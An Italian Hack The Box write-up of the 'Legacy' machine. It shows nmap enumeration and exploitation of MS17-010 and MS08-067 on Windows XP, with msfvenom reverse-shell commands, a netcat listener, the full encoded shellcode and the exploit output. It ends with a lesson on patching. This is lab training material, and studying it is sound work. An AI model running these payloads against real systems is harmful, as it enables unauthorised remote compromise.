**Author: Noto La Diega Alessandro**

**Target: 10.10.10.4**

# INFORMATION GATHERING

Iniziamo con un classico scan [[Nmap]]
```bash
┌──(root㉿kali)-[/home/kali/htb/legacy]
└─# nmap -sC -sV -O  10.10.10.4 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 03:43 EDT
Nmap scan report for 10.10.10.4
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/12%OT=135%CT=1%CU=31494%PV=Y%DS=2%DC=I%G=Y%TM=645DEE
OS:4B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS
OS:=0)SEQ(SP=100%GCD=1%ISR=10C%TI=I%CI=I%TS=0)OPS(O1=M53CNW0NNT00NNS%O2=M53
OS:CNW0NNT00NNS%O3=M53CNW0NNT00%O4=M53CNW0NNT00NNS%O5=M53CNW0NNT00NNS%O6=M5
OS:3CNNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%D
OS:F=Y%T=80%W=FAF0%O=M53CNW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0
OS:%S=O%A=S+%F=AS%O=M53CNW0NNT00NNS%RD=0%Q=)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T
OS:=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m41s, deviation: 2h07m16s, median: 4d22h57m41s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9ff65 (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-05-17T12:41:43+03:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
```

Uno scan su tutte le porte non ci da nessuna nuova porta

# ENUMERATION

Notiamo che abbimao 3 porte aprte:
```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

#Sistema operativo:
OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

Cerchiamo qualche vunerabilità nota per questa porte

```basg
nmap -v --script smb-vuln* -p 139,445 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 03:48 EDT

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
Initiating NSE at 03:48
Completed NSE at 03:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.74 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```


Abbiamo due vulnerabilità [[Port 139 Netbios#^084e1c| MS08-067 (netapi)]] e [[Port 139 Netbios#^53cb4b| MS17-010 (Eternalblue)]] 

# EXPLOITATION

## **MS17-010 

^dfefd1

Dopo una breve ricerca troviamo questo articolo, che spiega grosso modo l'exploit
https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/

Questa repo è quella aggiornata la scarichiamo  
git clone https://github.com/c1ph3rm4st3r/MS17-010_CVE-2017-0143 ^a32b2b

Creiamo il nostro exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/legacy/MS17-010_CVE-2017-0143]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe -o ms17-010.exe   
```

Ci mettiamo in ascolto sulla porta 443

```bash
┌──(root㉿kali)-[/home/kali/htb/legacy]
└─# nc -lnvp 443                
listening on [any] 443 ...
```

>FIXIT: lo scirpit send_and execute.py è sato sviluppato in python2.7 e ci mancano alcune librerie che aggiungiamo 
  con i seguenti comandi 
  cd MS17-010_CVE-2017-0143/
  sudo python2.7 get-pip.py
  pip2.7 install --upgrade setuptools
  python2.7 -m pip install impacket

Una volta pronti possiamo lanciare il nostro exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/legacy/MS17-010_CVE-2017-0143]
└─# python2.7 send_and_execute.py 10.10.10.4 ms17-010.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x860243e8
SESSION: 0xe224df58
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1798558
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe17985f8
overwriting token UserAndGroups
Sending file HHXYZY.exe...
Opening SVCManager on 10.10.10.4.....
Creating service xalO.....
Starting service xalO.....
The NETBIOS connection with the remote host timed out.
Removing service xalO.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Otteniamo cosi una shell con massimi privilegi 

```bash
┌──(root㉿kali)-[/home/kali/htb/legacy]
└─# nc -lnvp 443                
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.4] 1036
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

### Tips1 

la macchina target non ha il binario whoami.exe per poter verificare l'utente, non possiamo scaricarlo in quanto 
non è presente ne nc che powershell, quindi porviamo un via diversa, 
Kali ha l'eseguibile whoami.exe al segente percorso:

```bash
┌──(root㉿kali)-[/home/kali]
└─# locate whoami.exe  
/usr/share/windows-resources/binaries/whoami.exe
```
 
con smbserver.py tiriamo su un server SMB con una certella condivisa temp nella quale mettiamo il percorso whoami.exe

```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
```

Verifichiamo che il server sia su 

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.10.14.21/temp
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D     4096  Thu May 11 16:24:34 2023
  ..                                  D     4096  Mon Aug  8 06:07:17 2022
  nc.exe                             AN    59392  Fri Mar  3 08:15:47 2023
  whoami.exe                         AN    66560  Fri Mar  3 08:15:47 2023
  klogger.exe                        AN    23552  Fri Mar  3 08:15:47 2023
  vncviewer.exe                      AN   364544  Fri Mar  3 08:15:47 2023
  fport                               D     4096  Thu May 11 16:24:34 2023
  exe2bat.exe                        AN    53248  Fri Mar  3 08:15:47 2023
  mbenum                              D     4096  Thu May 11 16:24:34 2023
  wget.exe                           AN   308736  Fri Mar  3 08:15:47 2023
  plink.exe                          AN   837936  Fri Mar  3 08:15:47 2023
  nbtenum                             D     4096  Thu May 11 16:24:34 2023
  enumplus                            D     4096  Thu May 11 16:24:34 2023
  radmin.exe                         AN   704512  Fri Mar  3 08:15:47 2023
  fgdump                              D     4096  Thu May 11 16:24:34 2023

                148529400 blocks of size 7680. 148529400 blocks available
smb: \>
```


Ora dalla macchina target eseguiamo whoami.exe
```cmd
C:\WINDOWS\system32>\\10.10.14.21\temp\whoami.exe
\\10.10.14.21\temp\whoami.exe
NT AUTHORITY\SYSTEM

C:\WINDOWS\system32>
```

## MS08-067

Dopo una breve ricerca troviamo il questo exploit,e lo copiamo
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

Seguento le istruzioni creiamo il nostro payload con il seguente comando 

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Prediamo l'output e lo sositiuimao con quello presente all'interno dell'exploit
```bash
┌──(root㉿kali)-[/home/kali/htb/legacy/MS08-67]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xde\xe6\xf9\xe1\x83\xee\xfc\xe2\xf4\x22\x0e\x7b\xe1"
"\xde\xe6\x99\x68\x3b\xd7\x39\x85\x55\xb6\xc9\x6a\x8c\xea"
"\x72\xb3\xca\x6d\x8b\xc9\xd1\x51\xb3\xc7\xef\x19\x55\xdd"
"\xbf\x9a\xfb\xcd\xfe\x27\x36\xec\xdf\x21\x1b\x13\x8c\xb1"
"\x72\xb3\xce\x6d\xb3\xdd\x55\xaa\xe8\x99\x3d\xae\xf8\x30"
"\x8f\x6d\xa0\xc1\xdf\x35\x72\xa8\xc6\x05\xc3\xa8\x55\xd2"
"\x72\xe0\x08\xd7\x06\x4d\x1f\x29\xf4\xe0\x19\xde\x19\x94"
"\x28\xe5\x84\x19\xe5\x9b\xdd\x94\x3a\xbe\x72\xb9\xfa\xe7"
"\x2a\x87\x55\xea\xb2\x6a\x86\xfa\xf8\x32\x55\xe2\x72\xe0"
"\x0e\x6f\xbd\xc5\xfa\xbd\xa2\x80\x87\xbc\xa8\x1e\x3e\xb9"
"\xa6\xbb\x55\xf4\x12\x6c\x83\x8e\xca\xd3\xde\xe6\x91\x96"
"\xad\xd4\xa6\xb5\xb6\xaa\x8e\xc7\xd9\x19\x2c\x59\x4e\xe7"
"\xf9\xe1\xf7\x22\xad\xb1\xb6\xcf\x79\x8a\xde\x19\x2c\xb1"
"\x8e\xb6\xa9\xa1\x8e\xa6\xa9\x89\x34\xe9\x26\x01\x21\x33"
"\x6e\x8b\xdb\x8e\xf3\xeb\xd0\xf3\x91\xe3\xde\xe7\x42\x68"
"\x38\x8c\xe9\xb7\x89\x8e\x60\x44\xaa\x87\x06\x34\x5b\x26"
"\x8d\xed\x21\xa8\xf1\x94\x32\x8e\x09\x54\x7c\xb0\x06\x34"
"\xb6\x85\x94\x85\xde\x6f\x1a\xb6\x89\xb1\xc8\x17\xb4\xf4"
"\xa0\xb7\x3c\x1b\x9f\x26\x9a\xc2\xc5\xe0\xdf\x6b\xbd\xc5"
"\xce\x20\xf9\xa5\x8a\xb6\xaf\xb7\x88\xa0\xaf\xaf\x88\xb0"
"\xaa\xb7\xb6\x9f\x35\xde\x58\x19\x2c\x68\x3e\xa8\xaf\xa7"
"\x21\xd6\x91\xe9\x59\xfb\x99\x1e\x0b\x5d\x19\xfc\xf4\xec"
"\x91\x47\x4b\x5b\x64\x1e\x0b\xda\xff\x9d\xd4\x66\x02\x01"
"\xab\xe3\x42\xa6\xcd\x94\x96\x8b\xde\xb5\x06\x34";
```

sostituiamo quello presente in shellcode da "" con l'output ottenuto prima

ci mettiamo sempre in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/legacy]
└─# nc -lnvp 443
listening on [any] 443 ..
```

e siamo pronti per lanciare l'exploit, ( il 6 come si legge nel codice fa riferimento alla verisone 
di XP nel nostro caso come da enumerazioe XP English

```bash
python ms08-067.py 10.10.10.4 6 445  

$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

#Otteniamo cosi la shell di ritorno
┌──(root㉿kali)-[/home/kali/htb/legacy]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.4] 1035
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
```

# LESSON LEARNED

Questa era una macchina relativamente semplice da risolvere. Stava eseguendo una versione obsoleta vulnerabile di SMB. Finora ho risolto quattro macchine e ognuna di esse mi ha richiesto di sfruttare una versione vulnerabile di alcuni software per ottenere un punto d'appoggio sulla macchina o per aumentare i privilegi. Quindi è ovvio che dovresti sempre aggiornare i tuoi sistemi, specialmente quando vengono rilasciati aggiornamenti per vulnerabilità critiche! Se l'utente avesse installato l'aggiornamento di sicurezza MS17–010, avrei dovuto trovare un altro modo per sfruttare questa macchina.
